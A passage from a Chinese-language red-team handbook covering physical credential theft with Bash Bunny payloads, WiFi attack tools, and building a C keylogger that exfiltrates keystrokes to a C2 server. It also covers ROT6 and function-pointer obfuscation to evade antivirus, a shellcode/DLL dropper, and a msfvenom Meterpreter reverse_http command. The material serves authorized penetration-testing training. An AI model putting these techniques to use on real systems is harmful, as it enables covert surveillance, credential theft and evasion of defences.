  \n## Bash Bunny\n\n在之前的书中，我们介绍了 `Rubber Ducky` ([`https://hakshop.com/collections/usb-rubber-ducky`](https://hakshop.com/collections/usb-rubber-ducky))\
  \ 及其模拟 HID 设备（如键盘）并存储命令的方式。作为红队人员，`Rubber Ducky` 仍然是一个很好的工具，因为它可以加速 PowerShell 命令的交付，用于社会工程学练习，并能够在没有键盘但具有\
  \ USB 插槽的亭式系统上进行妥协。\n\n`Bash Bunny` 是该工具的进阶版本。它不仅可以执行 HID 式攻击，而且还可以做更多的事。`Bash Bunny`\
  \ 有两个独立的设置，用于存储两次攻击（和一个额外的设置用于管理）。这些载荷可以执行攻击以窃取凭据、进行网络钓鱼、执行 Ducky 攻击、运行 PowerShell\
  \ 命令、执行扫描和侦察、运行 Metasploit 自动化攻击 (Autopwn) 等。\n\n在之前的书中，我们介绍了如何使用 `KonBoot` ([`http://www.piotrbania.com/all/kon-boot/`](http://www.piotrbania.com/all/kon-boot/))\
  \ 来进入没有密码的机器。`KonBoot` 适用于未加密的机器，它从 USB 启动盘启动并覆盖本地管理密码。虽然这需要完全重启，但这能让你在没有凭据的情况下进入机器。如果你还没有玩过\
  \ `KonBoot`，我们在参与过程中经常使用它，并且取得了巨大的成功。\n\n有两个原因你可能不想使用 `KonBoot`：(1) 该攻击无法在加密机器上运行，和/或\
  \ (2) 你可能不想重启受害者的电脑。如何从被锁定的系统获取信息以访问网络上的其他内容或潜在地获取哈希/凭据？这正是 `Bash Bunny` 发挥作用的地方。\n\
  \n我们将使用 `Bash Bunny` 运行两种不同的攻击载荷。这两个载荷都允许我们从锁定（或解锁）的系统获取信息，只要我们具有物理访问权限。我们将演示 `BunnyTap`\
  \ 和 `QuickCreds` 的使用。\n\n### 潜入 Cyber Space Kittens 设施\n\n你终于潜入 `Cyber Space Kittens`\
  \ 设施的机房。在你周围没有人的情况下，你有几个小时的时间去折腾。你来到第一台机器，放下 `KonBoot` 并重启系统，但这些系统是加密的。然后你来到下一台机器，该机器处于屏幕锁定状态。你将\
  \ `Bash Bunny` 插入两次，运行 `BunnyTap` 和 `QuickCreds` 开关。几分钟后，运行臭名昭著的 `Responder` 的 `QuickCreds`\
  \ 收集 NetNTLMv2 哈希。我们将这些哈希放入 `Hashcat` 中，几分钟就能破解用户的密码！对于无法获取或破解哈希的机器，`BunnyTap` 将启动\
  \ `PoisonTap`，捕获来自热门网站的 cookies，并可用于内部应用程序配置。我们获取这些 cookies，将攻击者笔记本电脑连接到他们的网络，将我们的\
  \ cookies 替换为敏感 Web 应用程序的 cookies，并在不知道任何密码的情况下访问这些 Web 应用程序。\n\n### 在 Kali 上设置\
  \ Bash Bunny\n\n*   下载最新固件：[`https://bashbunny.com/downloads`](https://bashbunny.com/downloads)\n\
  *   将 `Bash Bunny` 置于 Switch 3 - 激活模式（靠近 USB 端口）\n*   将固件放入 USB 挂载的根目录，拔掉，重新插入，并等待约\
  \ 10 分钟直到它闪烁蓝光\n*   一旦完成，回到 `Bash Bunny` 并编辑以下文件： `` `payloads > switch1 > payload.txt`\
  \ ``\n    *   # System default payload\n    *   `LED B SLOW`\n    *   `ATTACKMODE\
  \ ECM_ETHERNET STORAGE`\n*   拔掉设备\n*   在你的 Kali 盒子上设置互联网共享：\n\n    ```bash\n   \
  \ wget bashbunny.com/bb.sh\n    chmod +x bb.sh\n    ./bb.sh\n    ```\n\n    *  \
  \ 指导模式（选择所有默认值）\n\n*   将 `Bash Bunny` 置于 Switch 1（远离 USB）并插入。完成后，请连接到 `Bash Bunny`，你应该看到\
  \ Cloud <-> Laptop <-> Bunny 图像\n*   在你的 Kali 机器上，使用密码 `hak5bunny` 登录 `Bash Bunny`![](img/00170.jpeg)\n\
  \n### 登录 Bash Bunny\n\n*   在你的 Kali 机器上，使用密码 `hak5bunny` SSH 到 `Bash Bunny`\n  \
  \  ```bash\n    ssh root@172.16.64.1\n    ```\n*   让我们更新并在 `Bash Bunny` 上安装一些工具：\n\
  \n    ```bash\n    apt-get update\n    apt-get upgrade\n    export GIT_SSL_NO_VERIFY=1\n\
  \    git clone https://github.com/lgandx/Responder.git /tools/responder\n    git\
  \ clone https://github.com/CoreSecurity/impacket.git /tools/impacket\n    cd /tools/impacket\
  \ && python ./setup.py install\n    apt-get -y install dsniff\n    ```\n*   在 Kali\
  \ 机器上的另一个终端中，安装你想要的所有模块。\n\n    ```bash\n    git clone https://github.com/hak5/bashbunny-payloads.git\
  \ /opt/bashbunny-payloads\n    ```\n*   你可以选择任何类型的载荷，但在我们的情况下，我们将 `Bash Bunny` 设置为两种载荷：`BunnyTap`\
  \ 和 `QuickCreds`\n\n    *   `` `cp -R /opt/bashbunny-payloads/payloads/library/credentials/BunnyTap/*\
  \ /media/root/BashBunny/payloads/switch1/` ``\n    *   `` `cp -R /opt/bashbunny-payloads/payloads/library/credentials/QuickCreds/*\
  \ /media/root/BashBunny/payloads/switch2/` ``\n\n    *   注意，在 switch1 和 2 文件夹中都有一个名为\
  \ `payload.txt` 的文件。在这些文件中，你需要将其配置为攻击 Windows 或 Mac 机器。对于 Windows 机器，请确保将 `ATTACKMODE`\
  \ 设置为 `RNDIS_ETHERNET`，对于 Mac，将其配置为 `ECM_ETHERNET`\n\n### QuickCreds\n\n`QuickCreds`\
  \ 是一个很好的工具，利用 `Responder` 攻击从锁定和解锁的机器捕获 NTLMv2 挑战哈希。假设你进行物理评估，进入建筑物，遇到一堆锁定机器。你将\
  \ `Bash Bunny` 插入带有 `QuickCreds` 的开关，并等待每台机器大约 2 分钟。`Bash Bunny` 将接管网络适配器，使用 Responder\
  \ 重定向任何请求共享和认证，然后记录该数据。它将所有凭据保存到 USB 磁盘上的 loot 文件夹。\n\n![](img/00171.jpeg)\n\n参考资料：\n\
  \n*   [`https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/QuickCreds`](https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/QuickCreds)\n\
  *   [`https://room362.com/post/2016/snagging-creds-from-locked-machines/`](https://room362.com/post/2016/snagging-creds-from-locked-machines/)\n\
  \n### BunnyTap\n\n`BunnyTap` 基于 Samy Kamkar 的臭名昭著的 `PoisonTap` ([`https://www.youtube.com/watch?v=Aatp5gCskvk`](https://www.youtube.com/watch?v=Aatp5gCskvk))。`PoisonTap`\
  \ 是一个非常棒的工具，即使在锁定机器上也能执行以下操作：\n\n*   通过 USB（或 Thunderbolt）模拟以太网设备\n*   劫持来自机器（尽管是低优先级/未知网络接口）的所有互联网流量\n\
  *   从 Web 浏览器获取 Alexa 排名前 1,000,000 个网站的 HTTP cookies 和会话\n*   将内部路由器暴露给攻击者，使其可以通过出站\
  \ WebSocket 和 DNS 重绑定远程访问（感谢 Matt Austin 的重绑定想法！）\n*   在 HTTP 缓存中为数十万域名和常见的 JavaScript\
  \ CDN URL 安装持久 Web 基础后门，所有这些都可以通过缓存中毒访问用户 cookies\n\n\n\n\n*   允许攻击者远程强制用户发起 HTTP\
  \ 请求，并将响应代理返回（`GET` 和 `POST`），同时利用用户在任何被植入后门域中的 cookies。\n\n*   无需解锁设备即可实施\n\n*\
  \   即使设备被移除且攻击者离开后，后门和远程访问权限依然持续存在（[`samy.pl/poisontap/`](https://samy.pl/poisontap/)）\n\
  \n从物理评估的角度来看，你可以进入他们的办公室，将设备插入每台机器，然后等待大约 2 分钟。Bash Bunny 会将所有流量路由到自身。如果他们正在使用浏览器并处于活动状态（例如广告或任何定期更新的页面），BunnyTap\
  \ 将会启动，并请求 Alexa 排名前 1,000,000 的所有网站。如果受害用户在当时已登录这些网站中的任何一个，BunnyTap 将捕获该受害者的所有\
  \ cookies。现在，我们可以将这些 cookies 导入我们自己的计算机，用它们的 cookies 替换我们的 cookies，从而在不知晓其密码的情况下冒充他们。\n\
  \n请务必查看所有精彩的 Bash Bunny 有效载荷：\n\n*   https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library.\n\
  \n## WiFi\n\n在 WiFi 方面，我们攻击客户端的方式并没有发生任何显著变化。虽然我们看到的 WEP 网络明显减少，但这些攻击仍然包括解授权（deauth）、使用\
  \ `aireplay-ng` 以及捕获 IV 数据包。对于 WPA 无线网络，最佳策略仍然是对客户端进行解授权，捕获握手数据包，将其传递给 `hashcat`，然后破解密码。这两种方法都非常有效，而我最喜欢的工具是完全重写的\
  \ `Wifite2` 版本（[`github.com/derv82/wifite2`](https://github.com/derv82/wifite2)），搭配\
  \ Alfa `AWUS036NHA` 无线网卡使用。这是一个易于使用的界面，因为它支持多种攻击，基于 `aircrack` 运行，并且使得捕获哈希的破解变得轻松。\n\
  \n在设备方面，除了购买几只 Alfa 网卡外，执行更隐蔽 WiFi 攻击的简便方法是使用 `WiFi Pineapple Nano`（[`www.wifipineapple.com/pages/nano`](https://www.wifipineapple.com/pages/nano)）。如果你需要启动虚假的\
  \ `HostAP`，通过其他天线重新路由流量，建立虚假页面以捕获认证信息，执行所有 `MITM` 攻击，运行 `Responder` 以及其他攻击，`Nano`\
  \ 是一个轻量级的硬件工具，可以执行这些操作。\n\n对于那些不订阅 Pineapple 的用户，市面上也有一些很棒的工具可以执行许多企业级攻击。其中一个工具是\
  \ `eaphammer`（[`github.com/s0lst1c3/eaphammer`](https://github.com/s0lst1c3/eaphammer)）。`eaphammer`\
  \ 的功能包括：\n\n*   从 `WPA-EAP` 和 `WPA2-EAP` 网络中窃取 `RADIUS` 凭证。\n\n*   执行敌对 `portal`（门户）攻击以窃取\
  \ `AD` 凭证并执行间接无线 pivoting（ pivoting 指攻击者利用已控制的机器作为跳板进一步渗透网络）。\n\n*   执行强制 `portal`（\
  \ captive portal）攻击\n\n*   内置 `Responder` 集成\n\n*   支持 `Open`（开放）网络和 `WPA-EAP`/`WPA2-EAP`\n\
  \n*   大多数攻击无需手动配置。\n\n*   安装和设置过程无需手动配置。\n\n*   利用最新版本的 `hostapd` (2.6)\n\n*   支持\
  \ `evil twin`（邪恶双子）和 `karma` 攻击\n\n*   生成定时的 `Powershell` 有效载荷以进行间接无线 pivoting\n\
  \n*   集成的 `HTTP` 服务器用于敌对 `portal` 攻击\n\n*   支持 `SSID` 隐藏\n\n`eaphammer` 最棒的部分在于利用自定义攻击功能执行\
  \ `Responder` 风格的攻击或捕获 `NTLM` 挑战认证哈希以供破解（[`github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-using-hostile-portal-attacks`](https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-using-hostile-portal-attacks)）和间接\
  \ pivoting（[`github.com/s0lst1c3/eaphammer#iv---indirect-wireless-pivots`](https://github.com/s0lst1c3/eaphammer#iv-indirect-wireless-pivots)）。\n\
  \n## 结论\n\n物理攻击是最有趣的一类。它们让你肾上腺素飙升，让你感觉自己像个罪犯，并迫使你进行邪恶的思考。在许多我们的任务中，我们可能会花几天时间来侦察一家公司，观察守卫的轮换，并弄清楚他们有哪些类型的门。我们可能会尝试对员工的工牌进行长焦拍摄，记录人们离开大楼的时间，并找出能让我们进入大楼的弱点。\n\
  \n从 `Red Team`（红队）的角度来看，我们不仅要记录物理安全方面的弱点，还要记录人员方面的弱点。\n\n*   如果你触发了警报，有人来检查需要多长时间？\n\
  \n*   摄像头是否 24/7 监控？如果是，发现可疑情况后，需要多久才会派人调查？\n\n*   员工是否警惕“尾随”（tail-gating）行为？\n\n\
  *   如果你被拦下，你能否通过交涉摆脱困境？\n\n*   如果你伪装成设施工作人员（或任何第三方服务人员）相似的人，你会得到什么样的反应？\n\n最后，在开始之前，确保你有一个明确定义的范畴、一份“免死金牌”（即授权书）、`CISO`（首席信息安全官）/\
  \ `物理安全` 部门的电话号码，并确保与公司合作。你能详细规划的越多，被守卫按倒在地的可能性就越小，但也不能保证完全安全。\n\n"
- "# 7 四分卫突袭——规避 `AV` 和 `网络` 检测\n\n为 `Red Team` 活动编写代码\n\n成功 `Red Teamers`（红队成员）和\
  \ `Penetration Testers`（渗透测试员）之间的区别之一在于适应和理解不同防护措施的能力。无论是理解底层 `assembly`（汇编）、编写\
  \ `shellcode`（代码段）、创建自定义 `C2`（命令与控制）二进制文件，还是修改代码洞穴以隐藏我们的 `malware`（恶意软件），这些都是我们日常工作的一部分。我经常遇到不会编程的\
  \ `pentesters`（渗透测试员），虽然编程并非必需，但这绝对会导致他们职业成长的停滞。因此，我想专门 dedicate（ dedicte 译为：致力于/专门针对）一部分内容给那些较少使用低级语言编程的人，以帮助他们入门。\n\
  \n## 基础：构建 `Keylogger`（键盘记录器）\n\n`Keyloggers` 是任何 `pentest`（渗透测试）/ `Red Team` 不可或缺的工具，本节将指导你制作一个通用的\
  \ `Keylogger`。有时我们仅仅想要持续监控特定用户或获取额外的凭证。这可能是由于我们无法进行任何 `lateral movement`（横向移动）/\
  \ `privilege escalation`（权限提升），或者我们只是想监控用户以便未来的活动。在这些情况下，我们喜欢部署在受害者系统上持续运行并将击键数据发送到外部的\
  \ `Keyloggers`。以下示例仅是一个 `POC`（概念验证），本实验的目的是让你理解基础知识并在此基础上构建。所有这些使用 `C` 语言的原因是为了保持二进制文件相对较小，由于低级语言而获得更好的\
  \ `OS`（操作系统）控制，并规避 `AV`（防病毒软件）。在前一本著作中，我们用 `Python` 编写了一个 `Keylogger` 并使用 `py2exe`\
  \ 将其编译为二进制文件，但这些很容易被检测到。让我们通过一个稍微复杂的示例来逐步了解。\n\n### 设置你的环境\n\n这是编写和编译 `C` 以创建 `Windows`\
  \ 二进制文件和自定义 `Keylogger` 所需的基本设置。\n\n*   虚拟机中的 `Windows` 10\n\n*   安装 `Visual Studio`\
  \ 以便可以使用命令行编译器，并使用 `Vim` 进行代码编辑\n\n迄今为止，`Windows` API 编程最好的编码资源是 `Microsoft` 自己的\
  \ `Development Network`（开发网络）（`MSDN`）网站，地址为：`www.msdn.microsoft.com`。`MSDN` 是一个\
  \ invaluable（宝贵的）资源，详细说明了系统调用、类型和 `struct`（结构体）定义，并包含数十个示例。虽然本项目实际上并不需要，但通过阅读由 `Microsoft\
  \ Press` 出版的 `Windows` Internals（《Windows  internals》）书籍，可以获得对 `Windows` 操作系统的更深入理解。对于\
  \ `C` 语言，有一本由 `C` 语言的联合创始人之一合著的好书，名为 `Kernighan` 和 `Ritchie` 编写的《The C Programming\
  \ Language》。最后，阅读 `Beej` 的《Network` Programming 指南，该书有纸质版和在线版，是 `C` 语言套接字编程的绝佳入门指南。\n\
  \n### 从源代码编译\n\n\n\n\n在这些实验室中，将包含多个代码示例。实验室将通过微软的优化编译器（Optimizing Compiler）来编译代码，该编译器随\
  \ Visual Studio Community 附带提供并已内置于 Visual Studio Developer Command Prompt 中。安装完\
  \ VS Community 后，请务必在 `Tools -> Get Tools and Features` 下同时安装“通用 Windows 平台开发”和\"\
  C++桌面开发”。要编译示例代码，请打开开发者命令提示符（developer command prompt）的一个实例，然后导航到包含源代码的文件夹。最后，运行命令\
  \ ``cl sourcefile.c io.c``。这将生成一个与源文件同名的可执行文件。\n\n编译器默认使用 32 位模式，但该代码也可以编译为 64 位。若要编译出\
  \ 64 位版本，请运行位于 Visual Studio 文件夹中的批处理脚本。打开命令提示符后，导航至 ``C:\\Program Files (x86)\\\
  Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build``（请注意：此路径可能会因您的 Visual\
  \ Studio 版本不同而有所变化）。然后，运行命令 ``vcvarsall.bat x86_amd64``。这将配置微软编译器以编译 64 位二进制文件而非\
  \ 32 位二进制文件。现在，您只需通过运行 ``cl path/to/code.c`` 即可编译代码。\n\n## 示例框架\n\n本项目的目标是创建一个利用\
  \ C 语言和低级 Windows 函数来监控键盘输入的键记录器（keylogger）。该键记录器使用了 ``SetWindowsHookEx``和``LowLevelKeyboardProc``这两个函数。``SetWindowsHookEx``允许在本地和全局上下文中设置各种类型的钩子。在这种情况下，将使用参数\
  \ ``WH_KEYBOARD_LL``来获取低级键盘事件。\n\n```cpp\nHHOOK WINAPI SetWindowsHookEx(\n  _In_\
  \ int idHook,\n  _In_ HOOKPROC lpfn,\n  _In_ HINSTANCE hMod,\n  _In_ DWORD dwThreadId);\n\
  ```\n\n该函数接受一个整数作为钩子 ID，一个函数指针，一个模块句柄以及一个线程 ID。前两个值最为重要。钩子 ID（Hook ID）是您要安装的钩子类型的整数值。Windows\
  \ 在相关功能页面列出了可用的 ID。在我们的案例中，将使用 ID 为 13 或``WH_KEYBOARD_LL``的选项。 ``HOOKPROC``是一个指向回调函数的指针，每当被监控的过程收到数据时就会被调用这意味着每当按下键时，都会触发该\
  \ ``HOOKPROC``中的函数处理逻辑来将要写入文件的按键记录进行处理。\n\n“hMod”是指向包含由\"lpfn\"所指向之功能的 DLL 的句柄。“dwThreadId”将为\
  \ 0 以将此回调与桌面中的所有线程关联起来。最后，该函数返回一个整数，用于验证钩子是否正确设置；若未成功则退出此过程。\n\n第二部分所需的是回调函数（callback\
  \ function）。该程序的大部分工作将由该回调函数完成。它负责接收按键输入、将其转换为 ASCII 字符以及执行所有文件操作功能。“LowLevelKeyBoardProc”的原型看起来像这样(http://bit.ly/2HomCYQ):\
  \ \n\n```cpp\nLRESULT CALLBACK LowLevelKeyboardProc(\n  _In_ int nCode,\n  _In_\
  \ WPARAM wParam,\n  _In_ LPARAM lParam);\n```\n\n我们回顾一下 ``LowLevelKeyBoardProc``所需要的内容。函数的参数是一个整数，告诉\
  \ Windows 如何解释该消息。其中两个参数是：（1）\"wParam”，它是消息的标识符；以及（2）“lParam”，它是指向 KBDLLHOOKSTRUCT\
  \ 结构体的指针。”wParam”的值在对应的功能页面中有说明。“KBDLLHOOKSTRUCT”成员变量的描述详见另一页文档。(此处 ``Lparam``)\
  \ 。`'Lparam KDdllHookStruct’中的值为‘vkCode’(虚拟键码 Virtual Key Code)(http://bit.ly/2EMAGpw))。这是所按键的编码，而非实际的字母字符，因为字母会根据键盘的语言设置而有所变化。“Vkcode”稍后需要被转换为相应的字母表示；暂时您无需担心向我们的键盘回调函数传递参数的问题（因为它们会在钩子激活时由操作系统自动传入）。\n\
  \n因此，用于挂钩键盘的最初骨架代码看起来如下：https://github.com/cheetz/ceylogger/blob/master/skeleton。\n\
  \n在查看此骨架代码时，需注意其中包含 pragma 编译器注释、消息循环以及回调函数中返回“CallNextHookEx”行这三点内容。“Pragma comment”行是一条编译器指令，用于连接\
  \ User32 DLL 库”。该 DLL 包含了大部分后续即将调用的功能调用因此必须被链接；当然也可以通过编译选项直接完成这一操作。接下来消息环（message\
  \ loop）如果使用了\"LowLevelKeyboardProc 函数则必不可少 Microsoft MSDN 文档指出：“此钩子是在安装它的线程上下文中进行调用的。通过向已安装该钩子的线程发送一条消息来执行此调用因此，必须在该安装了钩子的拥有一个消息循环。”[http://bit.ly/2HomCYQ]\n\
  \n接下来返回\"callnextHookEx”是因为 MSDN 指出：“调用'CallNextHookEx 函数以链接到下一个钩子过程是可选的但如果未这么做其他已安装钩子程序的应用将无法接收相应的通知可能导致其行为不正确。除非您确实需要阻止这些应用程序看到此通知否则应该始终调用\
  \ Call Next Hook Ex。”[http://bit.ly/2H0n68h]\n\n接下来我们继续构建回调函数的功能部分——首先创建一个文件句柄（file\
  \ handle）。示例代码将创建名为\"log.txt”的文件并将其保存到 Windows 临时目录\"C:\\Windows\\Temp”。该文件的配置采用追加模式以便键记录器可以不断地将按键内容写入到此文件中。如果\
  \ temp 目录下不存在该文件则会自动创建一个新项目。“Going back to 'KBDLLHOOKstruct'“，这段代码声明了一个 KBDLLHOOKSTRUCT\
  \ 指针并将其赋值给 lParam 这将允许访问每次按键时'lparam’内部所包含的参数值随后检查\"wParam”是否返回了\"WM_KEYDOWN 事件以确定该键是否被按下执行此操作是因为钩子会在按键（press）和释放（release）两个阶段均触发。如果代码没有检测'MMKEYDOWN，程序将会重复写入每个两次。“After\
  \ checking for down press 接下来需要添加一个 switch 语句来检查“lParam 的\"vkCode(虚拟键码”以判断是否为特殊键某些特定类型的按键需与其他普通字符区别对待例如返回(Return)、控制(Control)、Shift、空格(Space)以及制表符(Tab)等。在默认情况下代码会将该键对应的\
  \ Vkcode 转换为实际字母这种转换可以通过使用 ToAscii\"函数来实现 Toascii 会接收 vkCode 扫描码 (Scan Code)\")键盘状态数组的指针用于存储字母输出的缓冲区指针以及在参数\
  \ uFlags(int 值设置为零\")\".VkCode 和 Scan code 来自于上面的 Key struct 而键盘状态是一个之前声明过的字节数组用来持有输出结果最后将\
  \ \"flags 设为 0。\n\n必须检查某些按键是否释放（例如 Shift 键等）这可以通过编写另一个“if 语句来检测'WM_KEYUP 事件随后使用\
  \ switch 判断需要处理的特定按键类型最终需要关闭文件并将控制权返回给‘CallNextHookEx”。回调函数如下所示：\n\n*   https://github.com/cheetz/ceylogger/blob/master/callback\n\
  \n\n\n此时，键盘记录器已完全具备功能。然而，存在几个问题。首先是运行该程序会弹出一个命令提示符窗口，这使得程序正在运行的状态显而易见，且该窗口无输出内容也显得颇为可疑。另一个问题是，如果键盘记录器将文件保存在运行它的同一台计算机上，其效用不大。\n\
  \n通过用 Windows 特有的 `WinMain` 函数入口点替换标准的 C `Main` 函数入口点，可以相对轻松地解决命令提示符问题。据我理解，其工作原理是因为\
  \ `WinMain` 是 Windows 上图形程序的入口点。尽管操作系统期望你处理程序窗口的创建，但我们可以告诉它不要创建任何窗口，因为我们拥有控制权。现在，该程序仅会在后台生成一个进程，而不会创建任何窗口。\n\
  \n程序的网络部分将 straightforward（直截了当）。首先通过声明 `WSAData`（[`bit.ly/2HAiVN7`](http://bit.ly/2HAiVN7)）、启动\
  \ Winsock、清除 hints 结构并填充相关参数来初始化 Windows 套接字函数。在我们的示例中，代码将使用 `AF_UNSPEC` 用于 IPV4，使用\
  \ `SOC_STREAM` 用于 TCP 连接，并使用 `getaddrinfo` 函数利用上述参数填充 `c2` 结构体。满足所有必要参数后，即可创建套接字。最后，`socket_connect`\
  \ 函数连接到该套接字。\n\n连接建立后，`socket_sendfile` 函数将承担大部分工作。它使用 Windows `CreateFile` 函数打开日志文件的句柄，然后使用\
  \ `GetFileSizeEx` 函数获取文件大小。获取文件大小后，代码将分配相应大小的缓冲区（另加一个字节用于填充），然后将文件内容读取到该缓冲区中。最后，通过套接字发送缓冲区内容。\n\
  \n对于服务器端，可以在 C2 服务器的 3490 端口上启动 socat 监听器（启动 socat 的命令：`socat - TCP4-LISTEN:3490,fork`）。一旦监听器启动且键盘记录器运行，您应该看到受害者主机的所有命令每\
  \ 10 分钟推送至 C2 服务器。键盘记录器的初始完整版本 1 可在以下位置找到：[`github.com/cheetz/ceylogger/tree/master/version1`](https://github.com/cheetz/ceylogger/tree/master/version1)。在编译\
  \ `version_1.c` 之前，请确保将 `getaddrinfo` 修改为您当前的 C2 IP 地址。编译代码的命令：`cl version_1.c io.c`。\n\
  \n最后需要提及的一个函数是 `thread_func`。`thread_func` 调用 `get_time` 函数获取当前分钟数。然后检查该值是否能被 5\
  \ 整除，因为该工具每 5 分钟发送一次文件。如果能被 5 整除，它将设置套接字并尝试连接到 C2。如果连接成功，它将发送文件并运行清理函数。然后，循环休眠 59\
  \ 秒。休眠函数之所以必要，是因为这一切都在一个恒定循环中运行，这意味着函数将在几秒内获取时间、设置连接、连接并发送文件。如果没有 59 秒的休眠，该函数可能会在\
  \ 1 分钟的时间间隔内将文件发送数十次。休眠函数允许循环等待足够长的时间，直到时间变更到下一分钟，因此每 5 分钟仅发送一次文件。\n\n### 混淆\n\n\
  执行混淆的方法有成百上千种。虽然本章无法逐一介绍，但我希望为您提供一些基本的技术和思路，以规避防病毒软件（AV）。\n\n如您可能已经了解，防病毒工具会查找特定的字符串。一种最简单的规避\
  \ AV 的方法是创建简单的置换密码（rotation cipher）并移位字符串中的字符。在下方的代码中，有一个基本的解密函数，将所有字符串移动 6 个字符（ROT6）。这会导致字符串乱码，可能不会被\
  \ AV 检测到。在程序开始时，代码将调用解密函数，将字符串数组还原为正常格式。解密函数如下所示：\n\n```\nint decrypt(const char*\
  \ string, char result[]) {\n    int key = 6;\n    int len = strlen(string);\n  \
  \  for (int n = 0; n < len; n++) {\n        int symbol = string[n];\n        int\
  \ e_symbol = symbol - key;\n        result[n] = e_symbol;\n    }\n    result[len]\
  \ = '\\0';\n    return 0;\n}\n```\n\n您可以在程序的版本 2 中看到此示例：[`github.com/cheetz/ceylogger/tree/master/version2`](https://github.com/cheetz/ceylogger/tree/master/version2)。\n\
  \n另一种用于逃避防病毒软件的方法是使用函数指针调用 User32.dll 中的函数，而不是直接调用函数。为此，首先编写函数定义，然后使用 Windows `GetProcAddress`\
  \ 函数查找要调用的函数地址，最后将函数定义指针分配给从 `GetProcAddress` 接收到的地址。关于如何使用函数指针调用 `SetWindowsHookEx`\
  \ 函数的示例可在以下位置找到：[`github.com/cheetz/ceylogger/blob/master/version3/version_3.c#L197-L241`](https://github.com/cheetz/ceylogger/blob/master/version3/version_3.c#L197-L241)\
  \ ([`bit.ly/2H0VboE`](http://bit.ly/2H0VboE))。\n\n程序的版本 3 结合了前一个示例中的字符串加密和通过指针调用函数的方法。有趣的是，如果您将编译后的二进制文件提交到\
  \ VirusTotal，您将不再在导入部分看到 User32.dll。在下图中，左图是版本 1，右图是使用调用指针的版本 3。\n\n您可以在以下位置找到版本\
  \ 3 的全部源代码：[`github.com/cheetz/ceylogger/tree/master/version3`](https://github.com/cheetz/ceylogger/tree/master/version3)。\n\
  \n为了确认是否成功规避了 AV，最好的选择是始终针对实时防病毒系统进行测试。在实际活动中，我不建议 ever（永远）使用 VirusTotal，因为您的样本可能会被发送给不同的厂商。然而，它非常适合测试/学习。对于我们的有效载荷（payloads），以下是\
  \ VirusTotal 的对比结果：\n\n对于版本 1，32 位，11/66 触发 AV：\n* https://www.virustotal.com/#/file/4f7e3e32f50171fa527cd1e53d33cc08ab85e7a945cf0c0fcc978ea62a44a62d/detection\n\
  * http://bit.ly/2IXfuQh\n\n对于版本 3，32 位，10/66 触发 AV：\n* https://www.virustotal.com/#/file/8032c4fe2a59571daa83b6e2db09ff2eba66fd299633b173b6e372fe762255b7/detection\n\
  * http://bit.ly/2IYyM7F\n\n最后，如果我们将版本 3 编译为 64 位有效载荷，我们得到 0/66！：\n* https://www.virustotal.com/#/file/e13d0e84fa8320e310537c7fdc4619170bfdb20214baaee13daad90a175c13c0/detection\n\
  * http://bit.ly/2JNcBmc\n\n### THP 自定义投放器\n\n\n\n\n\n**Dropper**是红队工具包的重要组成部分，允许您在无需将植入物留在受害者计算机上的情况下运行它们。保持植入物不在磁盘上可降低其被泄露的风险，使您的工作可以被多次使用。在本章中，我们将涵盖一个由\
  \ THP 开发的自定义 **Dropper**，它可以导入仅驻留于内存中的 Shellcode 或 DLL。\n\n在设计 Dropper 及其对应的服务器时，有几点需要注意。Dropper\
  \ 的目的是成为您军火库中的消耗品（即“用完即弃”），这意味着您需要假设以当前形式使用它会触发后续行动中的检测。\n\n为了使未来的行动更容易，您将希望开发一个标准的服务器，您可以重复使用它。在示例中，您将看到一个基本的网络实现，允许为不同的消息注册新的处理器（handler）。虽然此示例仅包括用于`LOAD_BLOB`消息类型的处理器，但您可以轻松添加新处理器以扩展功能。这使得成为一个良好的基线，因为您拥有了所有标准化的通信。\n\
  \n编写 Dropper（或任何其他期望被快速发现并逆向工程的软件）时的另一个重要步骤是清理您的字符串。调试消息在首次构建软件时非常有用，可以免除您手动步进调试器查看问题原因的需要。然而，如果它们意外保留在最终发布版本中，您将大大方便分析师逆向您的恶意软件的工作。很多时候，防病毒软件会根据独特的字符串或常量值进行签名。在示例中，我使用了\
  \ `InfoLog()` 和`ErrorLog()`，预处理器将在发布构建中将其编译掉。使用这些宏（检查 `_DEBUG` 是否已定义）将决定包含相关调用的方式。\n\
  \nTHP 自定义投送器代码：https://github.com/cheetz/thpDropper.git\n\n## Shellcode 与 DLLs\n\
  \n在以下示例中，您可以让 Dropper 加载完整 DLL 或 Shellcode。通常与许多公开植入物而言，您能够生成完整的 DLL，它将下载 DLL 并进行反射加载。让您的\
  \ Dropper 直接加载 DLL 将为您节省更多的 API 调用，从而更具隐蔽性。一些植入物可能由于它们的头部被修改而无法正确加载。如果您的某个植入物无法正常工作并且包含一种生成\
  \ Shellcode 的方法，那么这应该能解决您的问题。这是因为它们的自定义加载程序通常编写用于修复头部并从该 DLL 中加载它。\n\n网上也有大量的 Shellcode\
  \ 可供使用，像 shell-storm.org 这样的站点保存了为特定目的编写的 Shellcode 存档，其中一些可能对您的行动有所帮助。\n\n## 运行服务器\n\
  \n构建服务器很简单。在您的自定义 THP Kali 镜像上，您需要运行以下命令：\n\n### 首次编译：\n\n* `cd /opt/`\n* `sudo\
  \ apt-get install build-essential libssl-dev cmake git`\n* `git clone https://github.com/cheetz/thpDropper.git`\n\
  * `cd thpDropper/thpd`\n* `mkdir build`\n* `cd build`\n* `cmake ..`\n* `make`\n\n\
  ### 对于后续编译，您所需要做的就是：\n\n* `cd /opt/thpd/build`\n* `make`\n\n要运行服务器，编译后，您将输入：\n\n\
  * `./thpd [path to shellcode/DLL] [loadtype]`\n\n以下值当前适用于加载类型：\n\n| 0 | Shellcode\
  \ | 这将向客户端发送原始 Shellcode 字节 |\n| 1 | DLL | 这将发送一个正常的 DLL 文件以供反射加载到客户端 |\n\n虽然这些载荷（Shellcode/DLL）可以来自任何类型的\
  \ C2 工具（Metasploit/Meterpreter, Cobalt Strike 等），但在示例中我们将使用 Meterpreter 载荷。生成载荷：\n\
  \n### 用于 Shellcode 载荷：\n\n* `msfvenom -a x64 -p windows/x64/meterpreter/reverse_http\
  \ LHOST=<Your_IP> LPORT=<PORT> EnableStageEncoding=True -f c`\n* 注意，您必须获取`msfvenom`的输出，并且只取原始\
